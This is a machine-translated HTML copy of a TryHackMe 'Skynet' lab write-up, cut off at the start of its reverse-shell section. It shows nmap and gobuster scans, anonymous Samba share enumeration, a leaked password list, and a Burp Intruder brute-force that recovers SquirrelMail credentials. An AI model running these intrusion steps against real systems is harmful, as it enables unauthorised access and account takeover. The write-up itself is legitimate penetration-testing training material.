<html>
<head>
<title>TryHackMe writeup: Skynet</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe报道:天网</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-writeup-skynet-2c068f19521b?source=collection_archive---------0-----------------------#2022-10-26">https://infosecwriteups.com/tryhackme-writeup-skynet-2c068f19521b?source=collection_archive---------0-----------------------#2022-10-26</a></blockquote><div><div class="fc ii ij ik il im"/><div class="in io ip iq ir"><div class=""/><p id="d14b" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi kp translated"><span class="l kq kr ks bm kt ku kv kw kx di"> S </span> kynet是“<em class="ky">一个易受攻击的终结者主题Linux机器</em>”(<a class="ae kz" href="https://tryhackme.com/room/skynet" rel="noopener ugc nofollow" target="_blank">“tryhackme”，2019 </a>)。这个房间本身就很有趣——我花了一段时间才完成；一波三折。以SMB文件共享探测、电子邮件服务器和关于获得最后一个标志的相当简单的结尾为特色。</p><figure class="lb lc ld le gu lf gi gj paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gi gj la"><img src="../Images/65e02da16d7e4a423a51efa52a48f002.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Drzbg6vwNnVVUsn9JIQ7Xg.jpeg"/></div></div><figcaption class="lm ln gk gi gj lo lp bd b be z dk translated">图像库:<a class="ae kz" href="https://lifestyle.howstuffworks.com/crafts/drawing/how-to-draw-a-cityscape.htm" rel="noopener ugc nofollow" target="_blank"> HowStuffWorks (n.d.) </a>和<a class="ae kz" href="https://www.wallpaperflare.com/woman-riding-motorcycle-illustration-fate-series-anime-anime-girls-wallpaper-ptdsp" rel="noopener ugc nofollow" target="_blank">壁纸Flare (n.d.) </a></figcaption></figure><h1 id="961f" class="lq lr iu bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated">目录</h1><ol class=""><li id="85b0" class="mo mp iu jt b ju mq jy mr kc ms kg mt kk mu ko mv mw mx my bi translated">程序</li><li id="df46" class="mo mp iu jt b ju mz jy na kc nb kg nc kk nd ko mv mw mx my bi translated">结论</li><li id="f5b4" class="mo mp iu jt b ju mz jy na kc nb kg nc kk nd ko mv mw mx my bi translated">尾注</li><li id="e9e4" class="mo mp iu jt b ju mz jy na kc nb kg nc kk nd ko mv mw mx my bi translated">参考</li></ol><h1 id="acdd" class="lq lr iu bd ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn bi translated">程序</h1><p id="9393" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc ne ke kf kg nf ki kj kk ng km kn ko in bi translated">在我继续之前，我需要清楚地定义这个房间的目标。攻击者要在目标系统上设计出一个属于低特权帐户的标志。那么目标是找出属于根帐户的标志。通过快速修改<code class="fe nh ni nj nk b">/etc/hosts</code>以包含<code class="fe nh ni nj nk b">skynet.thm</code>伪域名，并点击第一个任务右上角的强制性绿色“启动机器”按钮，我现在可以开始工作了。</p><h2 id="4392" class="nl lr iu bd ls nm nn dn lw no np dp ma kc nq nr me kg ns nt mi kk nu nv mm nw bi translated">探索</h2><p id="3040" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc ne ke kf kg nf ki kj kk ng km kn ko in bi translated">我将从浏览网页浏览器上的<code class="fe nh ni nj nk b">skynet.thm</code>伪域名开始，快速判断网页服务器是否在运行，如果是，显示什么内容。确实有一个web服务器运行在标准端口80上。图1描述了在目标机器上运行的web应用程序:</p><figure class="lb lc ld le gu lf gi gj paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gi gj nx"><img src="../Images/9a37bc478b479f92000e4e709ff3484e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*t776HZHeMNmx5lUs.png"/></div></div><figcaption class="lm ln gk gi gj lo lp bd b be z dk translated">图1</figcaption></figure><p id="3222" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我决定探查web应用程序本身的一些漏洞。但是，在这样做之前，我想我应该对目标系统运行一个<a class="ae kz" href="https://nmap.org/" rel="noopener ugc nofollow" target="_blank">nmap(n . d .)】</a>扫描，看看是否有其他有趣的服务在其上运行——比喻一石二鸟:</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="6404" class="nl lr iu nk b gz oc od l oe of"><strong class="nk iv">┌──(dna㉿deniers)-[~/skynet]<br/>└─ #</strong> <strong class="nk iv">sudo nmap -sT -A -v -Pn -p- -O -sC -oX tcp_scan.xml skynet.thm</strong><br/>Host discovery disabled (-Pn). All addresses will be marked ‘up’ and scan times may be slower.<br/>Starting Nmap 7.92 (https://nmap.org) at [redacted]<br/>NSE: Loaded 155 scripts for scanning.<br/>NSE: Script Pre-scanning.<br/>Initiating NSE at 06:50<br/>Completed NSE at 06:50, 0.00s elapsed<br/>Initiating NSE at 06:50<br/>Completed NSE at 06:50, 0.00s elapsed<br/>Initiating NSE at 06:50<br/>Completed NSE at 06:50, 0.00s elapsed<br/>Initiating Connect Scan at 06:50<br/>Scanning skynet.thm (redacted) [65535 ports]</span><span id="9a4a" class="nl lr iu nk b gz og od l oe of">[... snip ...]</span></pre><p id="dd16" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我还让<em class="ky">gobuster</em>(<a class="ae kz" href="https://github.com/OJ/gobuster" rel="noopener ugc nofollow" target="_blank">Mehlmauer等人，n.d. </a>)实用程序扫描隐藏目录，作为我在同一时间框架内完成多项任务的计划的一部分:</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="4a6c" class="nl lr iu nk b gz oc od l oe of"><strong class="nk iv">┌──(dna㉿deniers)-[~/skynet]<br/>└─$ gobuster dir -u http://skynet.thm -w ~/skynet/wordlist.txt -x php,php5,htm,html</strong><br/>===============================================================<br/>Gobuster v3.1.0<br/>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br/>===============================================================<br/>[+] Url:                     http://skynet.thm<br/>[+] Method:                  GET<br/>[+] Threads:                 10<br/>[+] Wordlist:                ~/skynet/wordlist.txt<br/>[+] Negative Status codes:   404<br/>[+] User Agent:              gobuster/3.1.0<br/>[+] Extensions:              php,php5,htm,html<br/>[+] Timeout:                 10s<br/>==============================================================<br/>[redacted] Starting gobuster in directory enumeration mode<br/>==============================================================</span><span id="39cb" class="nl lr iu nk b gz og od l oe of">[... snip ...]</span></pre><p id="1c16" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后，我运行了Burp Suite (n.d .)工具包，看看我是否可以让应用程序以一种非传统的方式运行。从webform开始，我在输入表单中键入字符串<code class="fe nh ni nj nk b">dna deniers</code>以尝试获得响应(图2 ),并尝试通过回车键、“天网搜索”(图2b)和“我感觉很幸运”按钮(图2c)让事件发生，而没有太多可观察到的事情发生。</p><figure class="lb lc ld le gu lf gi gj paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gi gj oh"><img src="../Images/48dc920d217fd058bfb07bd49d97d2ab.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ny0K3ZTpVFiwzs1T74n2hA.png"/></div></div><figcaption class="lm ln gk gi gj lo lp bd b be z dk translated">图2</figcaption></figure><p id="e77e" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我真正“观察”到的唯一一件事是在浏览器的URL表单上添加了磅<code class="fe nh ni nj nk b">#</code>字符(图2a)。尽管如此，通过这个漏洞载体接管这个系统还是有机会的，所以我查看了页面的HTML源代码。下面描述了相关的HTML代码:</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="f7ec" class="nl lr iu nk b gz oc od l oe of">&lt;body&gt;<br/>  &lt;div&gt;<br/>  &lt;img src="image.png"/&gt;<br/>  &lt;form name="skynet" action="#" method="POST"&gt;&lt;br&gt;<br/>    &lt;input type="search" class="search"&gt;&lt;br&gt;<br/>    &lt;input type="submit" class="button" name="submit" value="Skynet Search"&gt;<br/>    &lt;input type="submit" class="button" name="lucky" value="I'm Feeling Lucky"&gt;   <br/>  &lt;/form&gt;<br/>  &lt;/div&gt;<br/>&lt;/body&gt;</span></pre><p id="c699" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">从HTML源代码来看，与输入表单及其按钮进行交互不会有任何作用。看起来面向web应用程序不容易受到注入攻击。我现在将转向使用<em class="ky"> gobuster </em>的子目录发现攻击的结果；表1描述了已经报道的结果:</p><figure class="lb lc ld le gu lf gi gj paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gi gj oi"><img src="../Images/52e1d513503fc6a8e8ec70f54c39c818.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ld6POJXtKWDpxNI5hWkV0g.png"/></div></div><figcaption class="lm ln gk gi gj lo lp bd b be z dk translated">表1(注意<code class="fe nh ni nj nk b">REDIR →</code>是指重定向到其箭头右侧的网页)。</figcaption></figure><p id="e1fe" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">所有子目录的HTTP代码都是403 ( <a class="ae kz" href="https://datatracker.ietf.org/doc/html/rfc7231#section-6.5.3" rel="noopener ugc nofollow" target="_blank"> Fielding &amp; Reschke，2014，6.5.3 </a>)，除了<code class="fe nh ni nj nk b">/squirrelmail</code>子目录。图3描述了该子目录中浏览器的web应用程序:</p><figure class="lb lc ld le gu lf gi gj paragraph-image"><div class="gi gj oj"><img src="../Images/19f06d3e229713ed9cd3eb9eee5be7bb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1228/format:webp/1*Avb8qNXefvP9mSqx8hJ_ZA.png"/></div><figcaption class="lm ln gk gi gj lo lp bd b be z dk translated">图3</figcaption></figure><p id="1c81" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">从子目录<code class="fe nh ni nj nk b">/squirrelmail</code>可以推断，该子目录安装了<a class="ae kz" href="https://squirrelmail.org/" rel="noopener ugc nofollow" target="_blank">squirrel mail(n . d .)</a>webmail包。此实例正在运行版本<code class="fe nh ni nj nk b">1.4.23</code>，该版本有几个漏洞(<a class="ae kz" href="https://www.cvedetails.com/vulnerability-list/vendor_id-803/Squirrelmail.html" rel="noopener ugc nofollow" target="_blank"> CVE详细信息，n.d. </a>)。我稍后将回到这一点。</p><p id="cbcf" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">关于<em class="ky"> nmap </em>结果，图4描述了它能够识别哪些端口及其各自的服务:</p><figure class="lb lc ld le gu lf gi gj paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gi gj ok"><img src="../Images/75ae90abe9c7e2fcf0b0af01143ca27d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0q4AzQ-a0UqAEoRMsZcr3Q.png"/></div></div><figcaption class="lm ln gk gi gj lo lp bd b be z dk translated">图4</figcaption></figure><p id="4a99" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">目标计算机上运行的服务有:</p><ul class=""><li id="e97c" class="mo mp iu jt b ju jv jy jz kc ol kg om kk on ko oo mw mx my bi translated">OpenSSH服务器(版本。7.2p2)在端口22上。</li><li id="fecc" class="mo mp iu jt b ju mz jy na kc nb kg nc kk nd ko oo mw mx my bi translated">Apache服务器(版本。2.4.18)在端口80上。</li><li id="5f99" class="mo mp iu jt b ju mz jy na kc nb kg nc kk nd ko oo mw mx my bi translated">端口110上的Dovecot POP3服务器。</li><li id="ce4f" class="mo mp iu jt b ju mz jy na kc nb kg nc kk nd ko oo mw mx my bi translated">Samba文件共享服务器(版本。3.x或版本。4.x？)在139端口。</li><li id="9071" class="mo mp iu jt b ju mz jy na kc nb kg nc kk nd ko oo mw mx my bi translated">端口143上的Dovecot IMAP服务器。</li><li id="bd4a" class="mo mp iu jt b ju mz jy na kc nb kg nc kk nd ko oo mw mx my bi translated">Samba服务的NetBIOS组件(版本。4.3.11)在端口445上。</li></ul><p id="75a0" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">此外，目标计算机似乎正在运行某种版本的Microsoft Windows或某种版本的Ubuntu Linux，内核版本为3.x. <em class="ky"> nmap </em>还报告了有关文件共享的更多信息，如图5所示:</p><figure class="lb lc ld le gu lf gi gj paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gi gj op"><img src="../Images/db2b8e5fea31e95fe59e78f6978c7814.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9G2yusvjCR--FLnZHGUDQw.png"/></div></div><figcaption class="lm ln gk gi gj lo lp bd b be z dk translated">图5</figcaption></figure><p id="a4a4" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">知道这个文件共享的用户名是“guest”，我现在可以继续使用<code class="fe nh ni nj nk b">smbmap</code>实用程序(<a class="ae kz" href="https://www.kali.org/tools/smbmap/" rel="noopener ugc nofollow" target="_blank"> Kali Linux Tools，n.d. </a>)来枚举在目标系统上运行的Samba服务中的共享。我在攻击箱上运行了以下命令:</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="8fe3" class="nl lr iu nk b gz oc od l oe of"><strong class="nk iv">┌──(dna㉿deniers)-[~/skynet]<br/>└─$ smbmap -H skynet.thm</strong></span></pre><p id="4eb1" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">表2描述了该命令的输出:</p><figure class="lb lc ld le gu lf gi gj paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gi gj oq"><img src="../Images/c1618dec03593e227d7bb569406c5f11.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FXUFzSVyzRT7lkF3CA9kIw.png"/></div></div><figcaption class="lm ln gk gi gj lo lp bd b be z dk translated">表2</figcaption></figure><p id="da9c" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated"><code class="fe nh ni nj nk b">anonymous</code>文件共享具有只读访问权限。知道我现在可以继续使用<a class="ae kz" href="https://www.samba.org/samba/docs/current/man-html/smbclient.1.html" rel="noopener ugc nofollow" target="_blank"> smbclient (n.d.) </a>实用程序来探测它:</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="12fe" class="nl lr iu nk b gz oc od l oe of"><strong class="nk iv">┌──(dna㉿deniers)-[~/skynet]<br/>└─$ smbclient //skynet.thm/anonymous -U guest </strong><br/>Enter WORKGROUP\guest's password: *[inputs nothing]*<br/>Try "help" to get a list of possible commands.<br/><strong class="nk iv">smb: \&gt;</strong></span></pre><p id="e5fc" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">然后我列出并下载了所有我能找到的文件:</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="ee7d" class="nl lr iu nk b gz oc od l oe of"><strong class="nk iv">smb: \&gt; ls</strong><br/>  .                   D        0  Thu Nov 26 11:04:00 2020<br/>  ..                  D        0  Tue Sep 17 03:20:17 2019<br/>  attention.txt       N      163  Tue Sep 17 23:04:59 2019<br/>  logs                D        0  Wed Sep 18 00:42:16 2019</span><span id="5530" class="nl lr iu nk b gz og od l oe of">9204224 blocks of size 1024. 5691192 blocks available<br/><strong class="nk iv">smb: \&gt; get attention.txt</strong><br/>getting file \attention.txt of size 163 as attention.txt (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)<br/>smb: \&gt; cd logs<br/><strong class="nk iv">smb: \logs\&gt; dir</strong><br/>  .               D        0  Wed Sep 18 00:42:16 2019<br/>  ..              D        0  Thu Nov 26 11:04:00 2020<br/>  log2.txt        N        0  Wed Sep 18 00:42:13 2019<br/>  log1.txt        N      471  Wed Sep 18 00:41:59 2019<br/>  log3.txt        N        0  Wed Sep 18 00:42:16 2019</span><span id="662b" class="nl lr iu nk b gz og od l oe of">9204224 blocks of size 1024. 5691192 blocks available<br/><strong class="nk iv">smb: \logs\&gt; get log1.txt</strong><br/>getting file \logs\log1.txt of size 471 as log1.txt (0.8 KiloBytes/sec) (average 0.6 KiloBytes/sec)<br/><strong class="nk iv">smb: \logs\&gt; get log2.txt</strong><br/>getting file \logs\log2.txt of size 0 as log2.txt (0.0 KiloBytes/sec) (average 0.4 KiloBytes/sec)<br/><strong class="nk iv">smb: \logs\&gt; get log3.txt</strong><br/>getting file \logs\log3.txt of size 0 as log3.txt (0.0 KiloBytes/sec) (average 0.4 KiloBytes/sec)<br/><strong class="nk iv">smb: \logs\&gt;</strong></span></pre><p id="d7c3" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我用cat命令转储了<code class="fe nh ni nj nk b">attention.txt</code>文件和<code class="fe nh ni nj nk b">log1.txt</code>、<code class="fe nh ni nj nk b">log2.txt</code>和<code class="fe nh ni nj nk b">log3.txt</code>文件的内容。<code class="fe nh ni nj nk b">log2.txt</code>和<code class="fe nh ni nj nk b">log3.txt</code>没有任何内容，但是<code class="fe nh ni nj nk b">attention.txt</code>和<code class="fe nh ni nj nk b">log1.txt</code>有内容:</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="0797" class="nl lr iu nk b gz oc od l oe of"><strong class="nk iv">┌──(dna㉿deniers)-[~/skynet]<br/>└─$ cat attention.txt</strong><br/>A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.<br/>-Miles Dyson<br/>                                                                                                                                  <br/><strong class="nk iv">┌──(dna㉿deniers)-[~/skynet]<br/>└─$ cat log1.txt     <br/></strong>cyborg007haloterminator<br/>terminator22596<br/>terminator219<br/>terminator20<br/>terminator1989</span><span id="041c" class="nl lr iu nk b gz og od l oe of">[... snip ...]</span></pre><p id="5343" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">这里了解到三个重要的信息:第一个是有一个叫<em class="ky"> Miles Dyson </em>的人对系统有某种程度的管理特权，第二个是系统上的所有用户因为系统故障不得不重置他们的密码。</p><p id="4eef" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">第三是<code class="fe nh ni nj nk b">log1.txt</code>文件有一个潜在的密码列表，用户可以将密码重置为该列表。回到<em class="ky"> SquirrelMail </em> web应用程序，我认为我应该尝试通过暴力攻击获得对目标系统的初始访问权。</p><h2 id="e1df" class="nl lr iu bd ls nm nn dn lw no np dp ma kc nq nr me kg ns nt mi kk nu nv mm nw bi translated">初始访问</h2><p id="3f8a" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc ne ke kf kg nf ki kj kk ng km kn ko in bi translated">根据“Miles Dyson”这个名字，我使用了<code class="fe nh ni nj nk b">username_generator.py</code>工具(<a class="ae kz" href="https://github.com/shroudri/username_generator" rel="noopener ugc nofollow" target="_blank">“0x shroudri”，n.d. </a>)来创建一个潜在用户名列表，然后将它们通过管道传输到<code class="fe nh ni nj nk b">username_list</code>文件中:</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="fc1b" class="nl lr iu nk b gz oc od l oe of"><strong class="nk iv">┌──(dna㉿deniers)-[~/skynet]<br/>└─$ ./username_generator.py -w users &gt; username_list</strong></span><span id="8b11" class="nl lr iu nk b gz og od l oe of"><strong class="nk iv">┌──(dna㉿deniers)-[~/skynet]<br/>└─$ cat username_list   </strong>       <br/>miles<br/>dyson<br/>m.dyson<br/>m-dyson<br/>m_dyson<br/>m+dyson<br/>mdyson<br/>dysonmiles</span></pre><p id="6cf7" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">随着Burp Suite实例的运行，我可以使用其<em class="ky">集束炸弹</em>攻击(<a class="ae kz" href="https://portswigger.net/burp/documentation/desktop/tools/intruder/attack-types" rel="noopener ugc nofollow" target="_blank"> PortSwigger，n.d. </a>)通过SquirrelMail在目标系统上暴力攻击用户。我将首先故意向应用程序添加不正确的凭证，以便将<code class="fe nh ni nj nk b">POST</code>请求传递给Burp Suite的<em class="ky">入侵者。</em>图5和图6描绘了这一点:</p><figure class="lb lc ld le gu lf gi gj paragraph-image"><div class="gi gj or"><img src="../Images/dc7dad4bbc3f2bbfa788e261e0368145.png" data-original-src="https://miro.medium.com/v2/resize:fit:950/format:webp/1*NOuR0PDRfAXngJ9_Jbx8Pw.png"/></div><figcaption class="lm ln gk gi gj lo lp bd b be z dk translated">图6</figcaption></figure><figure class="lb lc ld le gu lf gi gj paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gi gj os"><img src="../Images/1786b14ebe3a1bbb82ee3154ab624640.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hfNMNuNyOFPpKkXXwhfpWQ.png"/></div></div><figcaption class="lm ln gk gi gj lo lp bd b be z dk translated">图7</figcaption></figure><p id="70d2" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我输入一个假用户名和假密码(图6a、6b)，然后点击“[l]登录”(图6c)。然后我看到一个“错误”页面(图7 ),显示我的用户名和密码组合不正确。</p><p id="1a36" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">现在，我可以通过导航到Burp Suite的HTTP History选项卡，将我尝试登录到目标系统的电子邮件服务的POST请求发送给入侵者。图8描述了这一点:</p><figure class="lb lc ld le gu lf gi gj paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gi gj ot"><img src="../Images/2ed7e02c0fa144510901fb01b79118de.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*n-st4mA3kls39lMoaVXiNw.png"/></div></div><figcaption class="lm ln gk gi gj lo lp bd b be z dk translated">图8</figcaption></figure><p id="d864" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我将首先进入HTTP History选项卡(图8a)，右键单击最近的HTTP POST请求(图8b)，然后单击Send to Intruder(图8c)。请求的报头被发送给入侵者，如图9所示:</p><figure class="lb lc ld le gu lf gi gj paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gi gj ou"><img src="../Images/2f53578e8d5d0968097126da2d005e06.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hLjRvIceRLA0CehYriKQzQ.png"/></div></div><figcaption class="lm ln gk gi gj lo lp bd b be z dk translated">图9</figcaption></figure><p id="002e" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">在入侵者选项卡中，我转到<em class="ky">位置</em>子选项卡(图9a)并将攻击类型配置为集束炸弹(图9b、9c)。然后，我清除了所有要注入有效载荷的部分(图9d ),并继续将<code class="fe nh ni nj nk b">login_username</code>和<code class="fe nh ni nj nk b">secretkey</code>标识为强力攻击的参数。我将它们都设置为注入各种用户名和密码组合的点，然后继续配置有效负载(图9g)。然后我就开始进攻了。</p></div><div class="ab cl ov ow hy ox" role="separator"><span class="oy bw bk oz pa pb"/><span class="oy bw bk oz pa pb"/><span class="oy bw bk oz pa"/></div><div class="in io ip iq ir"><p id="c0d6" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">在后台运行了一段时间后，我没有得到可以用来登录目标系统的用户名和密码组合。我摆弄了一下用户名列表，添加了<code class="fe nh ni nj nk b">milesdyson</code>，然后重新发起了攻击。几分钟后，我找到了一个有效的用户名和密码组合。图10描述了暴力的结果:</p><figure class="lb lc ld le gu lf gi gj paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gi gj pc"><img src="../Images/4efd90f524cc6bbb16bd414bdf3ed2fa.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*M_1EtB2zvB0LGRX6WdHUBA.png"/></div></div><figcaption class="lm ln gk gi gj lo lp bd b be z dk translated">图10</figcaption></figure><p id="97d3" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我能够通过下面的推理计算出用户名和密码的组合:不正确的密码将导致相同文件大小和相同HTTP状态代码的相同网页。图(10a，10b)分别示出了返回的网页的返回HTTP状态码和文件大小。<code class="fe nh ni nj nk b">milesdyson</code>和<code class="fe nh ni nj nk b">cyborg007haloterminator</code>有效负载的HTTP状态(302)和文件大小(2114)不同于所有其他请求。由此，我推断这是登录<em class="ky"> SquirrelMail </em>系统的正确用户名和密码组合。</p><p id="f87d" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我通过使用该组合登录系统来测试我的想法，如图11所示:</p><figure class="lb lc ld le gu lf gi gj paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gi gj pd"><img src="../Images/bed0876b09846682dc14db606c02ef94.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lVrF9GKJGYs1JqYj-8GSHQ.png"/></div></div><figcaption class="lm ln gk gi gj lo lp bd b be z dk translated">图11</figcaption></figure><p id="7718" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">我成功了，图12显示了我对戴森收件箱的访问:</p><figure class="lb lc ld le gu lf gi gj paragraph-image"><div role="button" tabindex="0" class="lg lh di li bf lj"><div class="gi gj pe"><img src="../Images/a8158e47b2473e97abd81d9183ccf26d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OXKprQQw8NUuj_48Grq8gw.png"/></div></div><figcaption class="lm ln gk gi gj lo lp bd b be z dk translated">图12</figcaption></figure><p id="f768" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">非常好。</p><h2 id="6933" class="nl lr iu bd ls nm nn dn lw no np dp ma kc nq nr me kg ns nt mi kk nu nv mm nw bi translated">后开发:反向外壳</h2><p id="b759" class="pw-post-body-paragraph jr js iu jt b ju mq jw jx jy mr ka kb kc ne ke kf kg nf ki kj kk ng km kn ko in bi translated">现在我可以看戴森的邮件了。从<code class="fe nh ni nj nk b">serenakogan@skynet</code>电子邮件地址发送了两封没有主题的邮件。第一条写道:</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="e510" class="nl lr iu nk b gz oc od l oe of">i can i i everything else . . . . . . . . . . . . . .<br/>balls have zero to me to me to me to me to me to me to me to me to<br/>you i everything else . . . . . . . . . . . . . .<br/>balls have a ball to me to me to me to me to me to me to me<br/>i i can i i i everything else . . . . . . . . . . . . . .<br/>balls have a ball to me to me to me to me to me to me to me<br/>i . . . . . . . . . . . . . . . . . . .<br/>balls have zero to me to me to me to me to me to me to me to me to<br/>you i i i i i everything else . . . . . . . . . . . . . .<br/>balls have 0 to me to me to me to me to me to me to me to me to<br/>you i i i everything else . . . . . . . . . . . . . .<br/>balls have zero to me to me to me to me to me to me to me to me to</span></pre><p id="130f" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">第二个写着:</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="50e1" class="nl lr iu nk b gz oc od l oe of">01100010 01100001 01101100 01101100 01110011 00100000 01101000 01100001 01110110<br/>01100101 00100000 01111010 01100101 01110010 01101111 00100000 01110100 01101111<br/>00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101<br/>00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111<br/>00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101<br/>00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111<br/>00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101<br/>00100000 01110100 01101111</span></pre><p id="2429" class="pw-post-body-paragraph jr js iu jt b ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko in bi translated">关于第二封邮件的正文，我认为它可能包含一条有趣的二进制编码信息。我使用了二进制到ASCII的转换器(<a class="ae kz" href="https://www.rapidtables.com/convert/number/binary-to-ascii.html" rel="noopener ugc nofollow" target="_blank"> RapidTables，n.d. </a>)，得到了以下ASCII消息:</p><pre class="lb lc ld le gu ny nk nz oa aw ob bi"><span id="e215" class="nl lr iu nk b gz oc od l oe of">balls have zero to me to me to me to me to me to me to me to me to</span></pre><p id="f38a" class="pw-post-body-paragraph jr js iu jt b 